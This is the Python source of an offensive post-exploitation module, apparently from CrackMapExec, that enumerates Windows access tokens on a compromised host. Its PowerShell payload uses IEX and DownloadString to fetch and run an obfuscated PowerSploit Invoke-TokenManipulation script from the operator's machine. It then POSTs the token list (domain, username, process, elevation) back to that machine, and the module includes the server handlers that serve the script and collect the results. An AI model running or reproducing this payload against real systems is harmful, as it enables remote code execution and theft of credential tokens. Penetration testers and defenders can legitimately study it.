from core.helpers import create_ps_command, obfs_ps_script, gen_random_string
from StringIO import StringIO

class CMEModule:
    '''
        Enumerates available tokens using Powersploit's Invoke-TokenManipulation
        Module by @byt3bl33d3r
    '''

    name = 'Tokens'

    def options(self, context, module_options):
        '''
        '''

        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-TokenManipulation.ps1');
        $creds = Invoke-{func_name} -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server, 
                                          port=context.server_port, 
                                          addr=context.localip,
                                          func_name=self.obfs_name)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        print connection.execute(payload, get_output=True)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-TokenManipulation.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open('data/PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1', 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data) > 0:
            context.log.success('Enumerated available tokens')

            buf = StringIO(data).read()
            for line in buf:
                context.log.highlight(line)
